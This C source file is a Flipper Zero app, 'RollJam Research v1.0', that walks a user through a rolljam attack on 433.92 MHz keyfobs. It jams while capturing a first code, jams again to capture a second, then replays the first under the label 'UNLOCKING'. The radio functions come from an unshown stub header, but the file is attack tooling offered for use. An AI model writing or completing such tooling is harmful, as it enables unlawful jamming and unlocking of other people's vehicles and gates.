#include "rolljam_app.h"
#include "rolljam_rf_stub.h"
#include <gui/elements.h>
#include <input/input.h>

static void draw(Canvas* canvas, void* ctx) {
    RollJamApp* app = ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontSecondary);

    switch(app->state) {
    case ROLLJAM_IDLE:
        canvas_draw_str(canvas, 2, 12, "RollJam Research v1.0");
        canvas_draw_str(canvas, 2, 28, "Freq:");
        canvas_draw_str(canvas, 40, 28, "433.92 MHz");
        canvas_draw_str(canvas, 2, 44, "Mod:");
        canvas_draw_str(canvas, 40, 44, "AM650");
        elements_button_center(canvas, "Start");
        break;

    case ROLLJAM_PHASE1_JAMMING:
        canvas_draw_str(canvas, 2, 20, "PHASE 1: JAMMING");
        canvas_draw_str(canvas, 2, 40, "Waiting keyfob 1...");
        break;

    case ROLLJAM_CAPTURED:
        canvas_draw_str(canvas, 20, 32, "Signal A Captured!");
        elements_button_center(canvas, "Next");
        break;

    case ROLLJAM_PHASE2_JAMMING:
        canvas_draw_str(canvas, 2, 20, "PHASE 2: JAMMING");
        canvas_draw_str(canvas, 2, 40, "Waiting keyfob 2...");
        break;

    case ROLLJAM_PHASE3_REPLAY:
        canvas_draw_str(canvas, 2, 20, "PHASE 3: UNLOCKING");
        canvas_draw_str(canvas, 2, 40, "Replaying Signal A...");
        break;

    case ROLLJAM_DONE:
        canvas_draw_str(canvas, 30, 32, "Done");
        break;
    }
}

static void input(InputEvent* e, void* ctx) {
    RollJamApp* app = ctx;
    if(e->type != InputTypeShort) return;

    if(e->key == InputKeyOk) {
        switch(app->state) {
        case ROLLJAM_IDLE:
            app->state = ROLLJAM_PHASE1_JAMMING;
            rf_phase1_jamming_start();
            break;

        case ROLLJAM_CAPTURED:
            app->state = ROLLJAM_PHASE2_JAMMING;
            rf_phase1_jamming_start();
            break;

        default:
            break;
        }
    }
}

int32_t rolljam_app(void) {
    RollJamApp app = {
        .state = ROLLJAM_IDLE,
        .frequency = 433920000,
        .modulation = "AM650",
        .cc1101_ok = rf_external_cc1101_present(),
    };

    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw, &app);
    view_port_input_callback_set(vp, input, &app);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);

    while(app.state != ROLLJAM_DONE) {
        if(app.state == ROLLJAM_PHASE1_JAMMING) {
            furi_delay_ms(1000);
            rf_phase1_jamming_stop();
            if(rf_capture_signal_A()) {
                app.state = ROLLJAM_CAPTURED;
            }
        }

        if(app.state == ROLLJAM_PHASE2_JAMMING) {
            furi_delay_ms(1000);
            if(rf_capture_signal_B()) {
                app.state = ROLLJAM_PHASE3_REPLAY;
            }
        }

        if(app.state == ROLLJAM_PHASE3_REPLAY) {
            rf_replay_signal_A();
            furi_delay_ms(500);
            app.state = ROLLJAM_DONE;
        }

        view_port_update(vp);
        furi_delay_ms(50);
    }

    gui_remove_view_port(gui, vp);
    view_port_free(vp);
    furi_record_close(RECORD_GUI);
    return 0;
}
